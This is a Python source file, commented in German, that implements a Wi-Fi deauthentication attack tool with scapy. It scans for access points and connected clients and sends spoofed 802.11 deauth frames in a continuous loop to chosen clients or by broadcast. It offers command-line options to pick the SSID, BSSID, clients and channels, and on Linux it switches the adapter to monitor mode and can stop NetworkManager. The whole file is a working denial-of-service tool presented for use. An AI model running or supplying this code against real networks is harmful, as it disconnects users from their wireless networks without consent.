#!/usr/bin/env python3
import sys
import signal
import logging
import argparse
import threading
import os
import traceback
import copy
from collections import defaultdict
from time import sleep
from typing import List, Dict, Union

from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth, Dot11Elt, Dot11Beacon, Dot11ProbeResp, Dot11ReassoResp, Dot11AssoResp, Dot11QoS

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# Versuche, util-Funktionen zu importieren (z. B. für farbige Ausgaben, Zeitmessung, etc.)
try:
    from .utils import *
except ImportError:
    from utils import *

conf.verb = 0

# Prüfe, ob Windows vorliegt
IS_WINDOWS = sys.platform.startswith('win')

if IS_WINDOWS:
    print("[INFO] Windows-Plattform erkannt. Linux-spezifische Funktionen werden deaktiviert.")

# Falls in utils nicht definiert, legen wir einige Konstanten fest:
BD_MACADDR = "ff:ff:ff:ff:ff:ff"
BOLD = "\033[1m"
YELLOW = "\033[33m"
GREEN = "\033[32m"
RED = "\033[31m"
RESET = "\033[0m"
DELIM = "-" * 80
BANNER = "Deauth Attack Tool für Windows 10"

# Definition eines einfachen BandType – falls in deinen Utils nicht vorhanden
class BandType:
    T_24GHZ = "2.4GHz"
    T_50GHZ = "5GHz"

# Falls in deinen Utils nicht vorhanden, hier minimal implementiert:
def get_time():
    import time
    return int(time.time())

def print_info(msg):
    print(f"[INFO] {msg}")

def print_error(msg):
    print(f"[ERROR] {msg}")

def print_cmd(msg):
    print(f"[CMD] {msg}")

def printf(msg, end="\n"):
    print(msg, end=end)

def clear_line(n):
    # Dummy-Funktion; in einer echten Terminalumgebung könnte man hier Zeilen löschen
    pass

def print_input(prompt):
    return input(prompt)

def restore_print():
    pass

def invalidate_print():
    pass

# Die Hauptklasse – mit bedingten Code-Pfaden für Linux bzw. Windows
class Interceptor:
    _ABORT = False
    _PRINT_STATS_INTV = 1
    _DEAUTH_INTV = 0.100  # 100ms
    _CH_SNIFF_TO = 2
    _SSID_STR_PAD = 42  # Gesamtlänge 80

    def __init__(self, net_iface, skip_monitor_mode_setup, kill_networkmanager,
                 ssid_name, bssid_addr, custom_client_macs, custom_channels, autostart, debug_mode):
        self.interface = net_iface
        self._max_consecutive_failed_send_lim = 5 / Interceptor._DEAUTH_INTV
        self._current_channel_num = None
        self._current_channel_aps = set()
        self.attack_loop_count = 0
        self.target_ssid: Union[SSID, None] = None
        self._debug_mode = debug_mode

        # Unter Windows wird der Monitor-Modus nicht automatisch aktiviert – das muss manuell erfolgen!
        if not skip_monitor_mode_setup:
            if IS_WINDOWS:
                print_info("Monitor-Modus-Aktivierung übersprungen (Windows). Bitte stelle sicher, dass dein Adapter manuell im gewünschten Modus ist.")
            else:
                print_info("Aktiviere Monitor-Modus...")
                if not self._enable_monitor_mode():
                    print_error("Monitor-Modus konnte nicht aktiviert werden")
                    raise Exception("Monitor-Modus nicht aktiviert")
                print_info("Monitor-Modus erfolgreich aktiviert")
        else:
            print_info("Monitor-Modus-Aktivierung wird übersprungen...")

        # Unter Windows ist das Stoppen des NetworkManagers nicht anwendbar
        if kill_networkmanager:
            if IS_WINDOWS:
                print_info("Stoppen des NetworkManagers nicht erforderlich unter Windows.")
            else:
                print_info("Stoppe NetworkManager...")
                if not self._kill_networkmanager():
                    print_error("Fehler beim Stoppen des NetworkManagers...")

        self._channel_range = {channel: defaultdict(dict) for channel in self._get_channels()}
        self.log_debug(f"Unterstützte Kanäle: {[c for c in self._channel_range.keys()]}")
        self._all_ssids: Dict[str, Dict[str, 'SSID']] = {BandType.T_24GHZ: dict(), BandType.T_50GHZ: dict()}
        self._custom_ssid_name: Union[str, None] = self.parse_custom_ssid_name(ssid_name)
        self.log_debug(f"Ausgewählter custom SSID-Name: {self._custom_ssid_name}")
        self._custom_bssid_addr: Union[str, None] = self.parse_custom_bssid_addr(bssid_addr)
        self.log_debug(f"Ausgewählte custom BSSID: {self._custom_bssid_addr}")
        self._custom_target_client_mac: Union[List[str], None] = self.parse_custom_client_mac(custom_client_macs)
        self.log_debug(f"Ausgewählte Ziel-Client MAC-Adressen: {self._custom_target_client_mac}")
        self._custom_target_ap_channels: List[int] = self.parse_custom_channels(custom_channels)
        self.log_debug(f"Ausgewählte Ziel-Kanäle: {self._custom_target_ap_channels}")
        self._custom_target_ap_last_ch = 0
        self._midrun_output_buffer: List[str] = list()
        self._midrun_output_lck = threading.RLock()
        self._autostart = autostart

    @staticmethod
    def parse_custom_ssid_name(ssid_name: Union[None, str]) -> Union[None, str]:
        if ssid_name is not None:
            ssid_name = str(ssid_name)
            if len(ssid_name) == 0:
                print_error("Custom SSID-Name darf nicht leer sein")
                raise Exception("Ungültiger SSID-Name")
        return ssid_name

    @staticmethod
    def parse_custom_bssid_addr(bssid_addr: Union[None, str]) -> Union[None, str]:
        if bssid_addr is not None:
            try:
                bssid_addr = Interceptor.verify_mac_addr(bssid_addr)
            except Exception as exc:
                print_error(f"Ungültige BSSID -> {bssid_addr}")
                raise Exception("Ungültige custom BSSID")
        return bssid_addr

    @staticmethod
    def verify_mac_addr(mac_addr: str) -> str:
        if len(mac_addr.split(":")) != 6:
            raise Exception("Ungültiges MAC-Adressformat")
        return mac_addr

    @staticmethod
    def parse_custom_client_mac(client_mac_addrs: Union[None, str]) -> List[str]:
        custom_client_mac_list = []
        if client_mac_addrs is not None:
            for mac in client_mac_addrs.split(','):
                try:
                    custom_client_mac_list.append(Interceptor.verify_mac_addr(mac.strip()))
                except Exception as exc:
                    print_error(f"Ungültige custom Client MAC -> {mac}")
                    raise Exception("Ungültige custom Client MAC")
        if custom_client_mac_list:
            print_info(f"Broadcast-Deauth wird deaktiviert; es werden nur angegebene Clients angegriffen: {custom_client_mac_list}")
        else:
            print_info("Keine custom Clients ausgewählt, broadcast Deauth wird verwendet und alle Clients werden angegriffen")
        return custom_client_mac_list

    def parse_custom_channels(self, channel_list: Union[None, str]):
        ch_list = []
        if channel_list is not None:
            try:
                ch_list = [int(ch) for ch in channel_list.split(',')]
            except Exception as exc:
                print_error(f"Ungültige custom Kanal-Angabe -> {channel_list}")
                raise Exception("Ungültige Kanal-Angabe")
            if len(ch_list):
                supported_channels = self._channel_range.keys()
                for ch in ch_list:
                    if ch not in supported_channels:
                        print_error(f"Custom Kanal {ch} wird von der Netzwerkschnittstelle nicht unterstützt. Unterstützt: {list(supported_channels)}")
                        raise Exception("Nicht unterstützter Kanal")
        return ch_list

    def _enable_monitor_mode(self):
        if IS_WINDOWS:
            print_info("Monitor-Modus-Aktivierung entfällt unter Windows – bitte Adapter manuell konfigurieren.")
            return True
        else:
            for cmd in [f"sudo ip link set {self.interface} down",
                        f"sudo iw {self.interface} set monitor control",
                        f"sudo ip link set {self.interface} up"]:
                print_cmd(f"Führe Befehl aus -> '{BOLD}{cmd}{RESET}'")
                if os.system(cmd):
                    os.system(f"sudo ip link set {self.interface} up")
                    return False
            sleep(2)
            iface_enabled = os.system(f"sudo ip link show {self.interface} | grep 'state DOWN' > /dev/null 2>&1")
            mm_enabled = os.system(f"sudo iw {self.interface} info | grep 'type monitor' > /dev/null 2>&1")
            self.log_debug(f"Interface aktiviert -> {iface_enabled != 0}")
            self.log_debug(f"Monitor-Modus aktiviert -> {mm_enabled == 0}")
            return True

    @staticmethod
    def _kill_networkmanager():
        if IS_WINDOWS:
            print_info("NetworkManager-Stopp nicht anwendbar unter Windows.")
            return True
        else:
            cmd = 'systemctl stop NetworkManager'
            print_cmd(f"Führe Befehl aus -> '{BOLD}{cmd}{RESET}'")
            return not os.system(cmd)

    def _set_channel(self, ch_num):
        if IS_WINDOWS:
            print_info(f"Unter Windows: Kanalwechsel per Skript nicht möglich – bitte stelle deinen Adapter manuell auf Kanal {ch_num} ein.")
            self._current_channel_num = ch_num
        else:
            os.system(f"iw dev {self.interface} set channel {ch_num}")
            self._current_channel_num = ch_num

    def _get_channels(self) -> List[int]:
        if IS_WINDOWS:
            # Rückgabe der gängigen 2,4-GHz-Kanäle (1 bis 11)
            return list(range(1, 12))
        else:
            return [int(channel.split('Channel')[1].split(':')[0].strip())
                    for channel in os.popen(f'iwlist {self.interface} channel').readlines()
                    if 'Channel' in channel and 'Current' not in channel]

    def _ap_sniff_cb(self, pkt):
        try:
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                ap_mac = str(pkt.addr3)
                ssid = pkt[Dot11Elt].info.strip(b'\x00').decode('utf-8').strip() or ap_mac
                if ap_mac == BD_MACADDR or not ssid or (self._custom_ssid_name_is_set() and self._custom_ssid_name.lower() not in ssid.lower()):
                    return
                elif self._custom_bssid_addr_is_set() and ap_mac.lower() != self._custom_bssid_addr.lower():
                    return
                # Unter Windows wird hier ein Dummy-Kanal verwendet
                pkt_ch = 1
                band_type = BandType.T_50GHZ if pkt_ch > 14 else BandType.T_24GHZ
                if ssid not in self._all_ssids[band_type]:
                    self._all_ssids[band_type][ssid] = SSID(ssid, ap_mac, band_type)
                self._all_ssids[band_type][ssid].add_channel(pkt_ch if pkt_ch in self._channel_range else self._current_channel_num)
                if self._custom_ssid_name_is_set():
                    self._custom_target_ap_last_ch = self._all_ssids[band_type][ssid].channel
            else:
                self._clients_sniff_cb(pkt)
        except Exception as exc:
            pass

    def _scan_channels_for_aps(self):
        if IS_WINDOWS:
            print_info("AP-Scan wird unter Windows nicht unterstützt. Bitte gib Ziel-AP über die Optionen -s und -b an.")
            return
        channels_to_scan = self._custom_target_ap_channels or self._channel_range.keys()
        print_info(f"Starte AP-Scan, bitte warten... (insgesamt {len(channels_to_scan)} Kanäle)")
        if self._custom_ssid_name_is_set():
            print_info(f"Suche nach Ziel-SSID -> {self._custom_ssid_name}")
        try:
            for idx, ch_num in enumerate(channels_to_scan):
                if self._custom_ssid_name_is_set() and self._found_custom_ssid_name() and self._current_channel_num - self._custom_target_ap_last_ch > 2:
                    return
                self._set_channel(ch_num)
                print_info(f"Scanne Kanal {self._current_channel_num} (verbleibend: {len(channels_to_scan) - (idx + 1)})", end="\r")
                sniff(prn=self._ap_sniff_cb, iface=self.interface, timeout=Interceptor._CH_SNIFF_TO, stop_filter=lambda p: Interceptor._ABORT)
        finally:
            printf("")
    
    def _found_custom_ssid_name(self):
        for all_channel_aps in self._all_ssids.values():
            for ssid_name in all_channel_aps.keys():
                if ssid_name == self._custom_ssid_name:
                    return True
        return False

    def _custom_ssid_name_is_set(self):
        return self._custom_ssid_name is not None

    def _custom_bssid_addr_is_set(self):
        return self._custom_bssid_addr is not None

    # Unter Windows überspringt diese Methode den Scan und erstellt ein "Dummy"-Objekt basierend auf den übergebenen Parametern
    def _start_initial_ap_scan(self) -> 'SSID':
        if IS_WINDOWS:
            if not self._custom_bssid_addr:
                Interceptor.abort_run("Unter Windows musst du über -b eine custom BSSID angeben, da kein Scan möglich ist.")
            ssid_name = self._custom_ssid_name if self._custom_ssid_name else "TargetAP"
            channel = self._custom_target_ap_channels[0] if self._custom_target_ap_channels else 1
            dummy_ssid = SSID(ssid_name, self._custom_bssid_addr, BandType.T_24GHZ)
            dummy_ssid.add_channel(channel)
            self._current_channel_num = channel
            print_info(f"Verwende Ziel-AP: SSID: {ssid_name}, BSSID: {self._custom_bssid_addr}, Kanal: {channel}")
            return dummy_ssid
        else:
            self._scan_channels_for_aps()
            for band_ssids in self._all_ssids.values():
                for ssid_name, ssid_obj in band_ssids.items():
                    self._channel_range[ssid_obj.channel][ssid_name] = copy.deepcopy(ssid_obj)
            pref = '[   ] '
            printf(f"{DELIM}\n{pref}{self._generate_ssid_str('SSID Name', 'Channel', 'MAC Address', len(pref))}")
            ctr = 0
            target_map: Dict[int, 'SSID'] = dict()
            for channel, all_channel_aps in sorted(self._channel_range.items()):
                for ssid_name, ssid_obj in all_channel_aps.items():
                    ctr += 1
                    target_map[ctr] = copy.deepcopy(ssid_obj)
                    pref = f"[{str(ctr).rjust(3, ' ')}] "
                    preflen = len(pref)
                    pref = f"[{BOLD}{YELLOW}{str(ctr).rjust(3, ' ')}{RESET}] "
                    printf(f"{pref}{self._generate_ssid_str(ssid_obj.name, ssid_obj.channel, ssid_obj.mac_addr, preflen)}")
            if not target_map:
                Interceptor.abort_run("Keine APs gefunden, beende...")
            printf(DELIM)
            chosen = -1
            if self._autostart:
                if len(target_map) > 1:
                    print_error("Autostart nicht möglich – mehr als 1 AP gefunden. Bitte engere Filter verwenden!")
                else:
                    print_info("Ein Ziel gefunden, Autostart wird ausgeführt")
                    chosen = 1
            while chosen not in target_map.keys():
                user_input = print_input(f"Wähle ein Ziel zwischen {min(target_map.keys())} und {max(target_map.keys())}:")
                try:
                    chosen = int(user_input)
                except ValueError:
                    print_error("Ungültige Eingabe – bitte eine ganze Zahl eingeben")
            return target_map[chosen]

    def _generate_ssid_str(self, ssid, ch, mcaddr, preflen):
        return f"{ssid.ljust(Interceptor._SSID_STR_PAD - preflen, ' ')}{str(ch).ljust(3, ' ').ljust(Interceptor._SSID_STR_PAD // 2, ' ')}{mcaddr}"

    def _clients_sniff_cb(self, pkt):
        try:
            if self._packet_confirms_client(pkt):
                ap_mac = str(pkt.addr3)
                if ap_mac == self.target_ssid.mac_addr:
                    c_mac = pkt.addr1
                    if c_mac not in [BD_MACADDR, self.target_ssid.mac_addr] and c_mac not in self.target_ssid.clients:
                        self.target_ssid.clients.append(c_mac)
                        add_to_target_list = len(self._custom_target_client_mac) == 0 or c_mac in self._custom_target_client_mac
                        with self._midrun_output_lck:
                            self._midrun_output_buffer.append(
                                f"Neuer Client {BOLD}{c_mac}{RESET} gefunden, hinzugefügt -> {GREEN if add_to_target_list else RED}{add_to_target_list}{RESET}")
        except:
            pass

    def _print_midrun_output(self):
        bf_sz = len(self._midrun_output_buffer)
        with self._midrun_output_lck:
            for output in self._midrun_output_buffer:
                print_cmd(output)
            if bf_sz > 0:
                printf(DELIM)
                bf_sz += 1
        return bf_sz

    @staticmethod
    def _packet_confirms_client(pkt):
        return (pkt.haslayer(Dot11AssoResp) and pkt[Dot11AssoResp].status == 0) or \
               (pkt.haslayer(Dot11ReassoResp) and pkt[Dot11ReassoResp].status == 0) or \
               pkt.haslayer(Dot11QoS)

    def _listen_for_clients(self):
        print_info("Höre auf neue Clients...")
        sniff(prn=self._clients_sniff_cb, iface=self.interface, stop_filter=lambda p: Interceptor._ABORT)

    def _get_target_clients(self) -> List[str]:
        return self._custom_target_client_mac or self.target_ssid.clients

    def _run_deauther(self):
        try:
            print_info("Starte Deauth-Schleife...")
            failed_attempts_ctr = 0
            ap_mac = self.target_ssid.mac_addr
            while not Interceptor._ABORT:
                try:
                    self.attack_loop_count += 1
                    for client_mac in self._get_target_clients():
                        self._send_deauth_client(ap_mac, client_mac)
                    if not self._custom_target_client_mac:
                        self._send_deauth_broadcast(ap_mac)
                    failed_attempts_ctr = 0
                except Exception as exc:
                    failed_attempts_ctr += 1
                    if failed_attempts_ctr >= self._max_consecutive_failed_send_lim:
                        raise exc
                    sleep(Interceptor._DEAUTH_INTV)
        except Exception as exc:
            Interceptor.abort_run(f"Exception '{exc}' in der Deauth-Schleife -> {traceback.format_exc()}")

    def _send_deauth_client(self, ap_mac: str, client_mac: str):
        sendp(RadioTap() / Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7), iface=self.interface)
        sendp(RadioTap() / Dot11(addr1=ap_mac, addr2=ap_mac, addr3=client_mac) / Dot11Deauth(reason=7), iface=self.interface)

    def _send_deauth_broadcast(self, ap_mac: str):
        sendp(RadioTap() / Dot11(addr1=BD_MACADDR, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7), iface=self.interface)

    def run(self):
        self.target_ssid = self._start_initial_ap_scan()
        ssid_ch = self.target_ssid.channel
        print_info(f"Ziel: {self.target_ssid.name}")
        print_info(f"Kanal: {ssid_ch}")
        self._set_channel(ssid_ch)
        printf(DELIM)
        threads = []
        for action in [self._run_deauther, self._listen_for_clients, self.report_status]:
            t = threading.Thread(target=action)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

    def report_status(self):
        start = get_time()
        printf(DELIM)
        while not Interceptor._ABORT:
            buffer_sz = self._print_midrun_output()
            print_info(f"Target SSID{self.target_ssid.name.rjust(80 - 15, ' ')}")
            print_info(f"Kanal{str(self._current_channel_num).rjust(80 - 11, ' ')}")
            print_info(f"MAC addr{self.target_ssid.mac_addr.rjust(80 - 12, ' ')}")
            print_info(f"Netzwerkschnittstelle{self.interface.rjust(80 - 17, ' ')}")
            print_info(f"Ziel-Clients{BOLD}{str(len(self._get_target_clients())).rjust(80 - 18, ' ')}{RESET}")
            print_info(f"Verstrichene Sekunden {BOLD}{str(get_time() - start).rjust(80 - 16, ' ')}{RESET}")
            sleep(Interceptor._PRINT_STATS_INTV)
            if Interceptor._ABORT:
                break
            clear_line(7 + buffer_sz)

    def log_debug(self, msg: str):
        if self._debug_mode:
            print_info(f"[DEBUG] {msg}")

    @staticmethod
    def user_abort(*_):
        Interceptor.abort_run("Benutzerabbruch – beende...")

    @staticmethod
    def abort_run(msg: str):
        if not Interceptor._ABORT:
            Interceptor._ABORT = True
            sleep(Interceptor._PRINT_STATS_INTV * 1.1)
            printf(DELIM)
            print_error(msg)
            exit(0)

def main():
    signal.signal(signal.SIGINT, lambda s, f: Interceptor.user_abort())
    printf(f"\n{BANNER}\n"
           f"Sicherstellen:\n"
           f"1. Als Administrator (bzw. mit entsprechenden Rechten) ausführen\n"
           f"2. Dein WLAN-Adapter unterstützt (falls möglich) den Monitor-Modus und ist korrekt eingestellt\n"
           f"Geschrieben von @flashnuke")
    printf(DELIM)
    restore_print()
    if not IS_WINDOWS and "linux" not in sys.platform:
        raise Exception(f"Nicht unterstütztes Betriebssystem: {sys.platform} (nur Linux und Windows)")
    parser = argparse.ArgumentParser(description='Ein einfaches Programm für Deauth-Attacks (Windows-Version)')
    parser.add_argument('-i', '--iface', help='Netzwerkschnittstelle mit (manuell gesetztem) Monitor-Modus (z. B. "wlan0")',
                        action='store', dest="net_iface", metavar="network_interface", required=True)
    parser.add_argument('-sm', '--skip-monitormode', help='Automatische Monitor-Modus-Aktivierung überspringen', action='store_true',
                        default=False, dest="skip_monitormode", required=False)
    parser.add_argument('-k', '--kill', help='NetworkManager stoppen (nur unter Linux relevant)', action='store_true',
                        default=False, dest="kill_networkmanager", required=False)
    parser.add_argument('-s', '--ssid', help='Custom SSID (nicht case-sensitiv)', metavar="ssid_name",
                        action='store', default=None, dest="custom_ssid", required=False)
    parser.add_argument('-b', '--bssid', help='Custom BSSID (nicht case-sensitiv)', metavar="bssid_addr",
                        action='store', default=None, dest="custom_bssid", required=False)
    parser.add_argument('-cm', '--clients', help='MAC-Adressen der Ziel-Clients (kommagetrennt)', metavar="client_mac_addrs",
                        action='store', default=None, dest="custom_client_macs", required=False)
    parser.add_argument('-ch', '--channels', help='Custom Kanäle (kommagetrennt, z. B. 1,6,11)', metavar="ch1,ch2",
                        action='store', default=None, dest="custom_channels", required=False)
    parser.add_argument('-a', '--autostart', help='Autostart der Deauth-Schleife (falls nur 1 AP gefunden wird)',
                        action='store_true', default=False, dest="autostart", required=False)
    parser.add_argument('-d', '--debug', help='Debug-Ausgaben aktivieren',
                        action='store_true', default=False, dest="debug_mode", required=False)
    pargs = parser.parse_args()
    invalidate_print()
    attacker = Interceptor(net_iface=pargs.net_iface,
                           skip_monitor_mode_setup=pargs.skip_monitormode,
                           kill_networkmanager=pargs.kill_networkmanager,
                           ssid_name=pargs.custom_ssid,
                           bssid_addr=pargs.custom_bssid,
                           custom_client_macs=pargs.custom_client_macs,
                           custom_channels=pargs.custom_channels,
                           autostart=pargs.autostart,
                           debug_mode=pargs.debug_mode)
    attacker.run()

if __name__ == "__main__":
    main()
